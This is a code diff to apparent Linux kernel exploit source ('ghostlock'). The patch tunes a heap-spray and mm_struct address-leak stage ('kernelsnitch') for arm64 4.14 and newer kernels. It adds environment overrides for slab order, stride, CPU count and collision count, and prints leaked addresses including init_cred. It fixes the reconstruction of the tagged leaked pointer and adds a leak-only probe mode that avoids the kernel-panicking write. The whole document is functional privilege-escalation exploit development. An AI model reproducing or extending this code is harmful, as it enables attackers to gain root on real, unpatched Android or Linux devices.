@@ -415,6 +415,11 @@ namespace ghostlock::support {
         (session::g_exploit_session.heap.current.fake_left) = write_layout.left;
         (session::g_exploit_session.heap.current.fake_fops) = write_layout.fops;
 
+        pr_info("[dbg] base=%016zx payload_base=%016zx delta=%zd ic_image=%016zx ic_alias=%016zx right=%016zx parent=%016zx\n",
+                (size_t)base, (size_t)payload_base, (ssize_t)payload_delta,
+                (size_t)session::g_exploit_session.addresses.init_cred_image_addr(),
+                (size_t)session::g_exploit_session.addresses.data_alias(session::g_exploit_session.addresses.init_cred_image_addr()),
+                (size_t)write_layout.right, (size_t)write_layout.parent);
         uintptr_t write_pc = (session::g_exploit_session.heap.current.fake_parent);
         uintptr_t write_right = (session::g_exploit_session.heap.current.fake_right);
         uintptr_t write_left = (session::g_exploit_session.heap.current.fake_left);
@@ -630,9 +635,37 @@ namespace ghostlock::support {
         }
 
         int32_t cpu_count = static_cast<int32_t>(sysconf(_SC_NPROCESSORS_ONLN));
+        if (const char *cpu_override = getenv("GHOSTLOCK_KS_CPU"); cpu_override && cpu_override[0]) {
+            const long parsed = strtol(cpu_override, nullptr, 0);
+            if (parsed > 0 && parsed <= 256) cpu_count = static_cast<int32_t>(parsed);
+        }
+        /* The mm_struct slab order is a kernel build parameter; 4.14 sizes the
+         * cache differently from the 5.x/6.x targets, so allow a probe run to
+         * try each candidate order instead of rebuilding. */
+        unsigned mm_slab_order = kernel::MM_ORDER;
+        if (const char *order_override = getenv("GHOSTLOCK_MM_ORDER");
+            order_override && order_override[0]) {
+            const long parsed = strtol(order_override, nullptr, 0);
+            if (parsed >= 0 && parsed < 8) mm_slab_order = static_cast<unsigned>(parsed);
+        }
+        size_t ks_collisions = ghostlock::profile::kernelsnitch_collisions();
+        if (const char *collision_override = getenv("GHOSTLOCK_KS_COLLISIONS");
+            collision_override && collision_override[0]) {
+            const long parsed = strtol(collision_override, nullptr, 0);
+            if (parsed > 0 && parsed <= 64) ks_collisions = static_cast<size_t>(parsed);
+        }
+        size_t mm_stride = session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ);
+        /* 4.14 slabs place objects at page_base + k*size, so a fixed 960 grid
+         * misses most slabs; a probe run can scan every 64 bytes instead. */
+        if (const char *stride_override = getenv("GHOSTLOCK_MM_STRIDE");
+            stride_override && stride_override[0]) {
+            const long parsed = strtol(stride_override, nullptr, 0);
+            if (parsed >= 8 && parsed <= 4096) mm_stride = static_cast<size_t>(parsed);
+        }
         kernelsnitch::KernelSnitchOwner snitch = kernelsnitch::KernelSnitchOwner::create(
-            session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ),
-            kernel::MM_ORDER, static_cast<size_t>(cpu_count), ghostlock::profile::kernelsnitch_collisions(), 0,
+            mm_stride,
+            mm_slab_order, static_cast<size_t>(cpu_count), ks_collisions,
+            (getenv("GHOSTLOCK_KS_VERBOSE") && getenv("GHOSTLOCK_KS_VERBOSE")[0] == '1') ? 1 : 0,
             static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
         /* The forked leak child borrows the shared mmap context through this
          * compatibility alias; the owner remains the only releaser. */
@@ -734,10 +767,20 @@ namespace ghostlock::support {
         spray_breadcrumb("step4 mm-leak-scan");
         pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
                 snitch.result(), ms_since(&t_spray));
-        uintptr_t leaked = snitch.result();
-        /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
-        leaked |= static_cast<uintptr_t>(0xf) << 56;
+        pr_info("[spray] raw snitch result=0x%zx\n", static_cast<size_t>(snitch.result()));
+        /* The leak hands back a tagged pointer: bits 56-59 carry the tag that
+         * matched, and 4.14/arm64 kernel addresses are 0xffffff8…, so rebuild
+         * the top 16 bits instead of merely OR-ing the tag nibble in. */
+        uintptr_t leaked = (snitch.result() & static_cast<uintptr_t>(0x0000ffffffffffffULL)) |
+                           static_cast<uintptr_t>(0xffff000000000000ULL);
         (session::g_exploit_session.heap.current.last_mm_struct) = leaked;
+        /* Probe mode: stop right after the leak so the geometry can be iterated
+         * on without driving the PI write (a wrong page there panics the
+         * kernel and costs a full reboot per attempt). */
+        if (const char *probe = getenv("GHOSTLOCK_PROBE_LEAK"); probe && probe[0] == '1') {
+            pr_info("probe: leak only (no write attempted)\n");
+            _exit(leaked == static_cast<uintptr_t>(-1) ? 3 : 0);
+        }
         /* mm_structs live in the direct map */
         if (leaked == static_cast<uintptr_t>(-1) ||
             leaked < kernel::KERNELSNITCH_IDENTITY_START ||
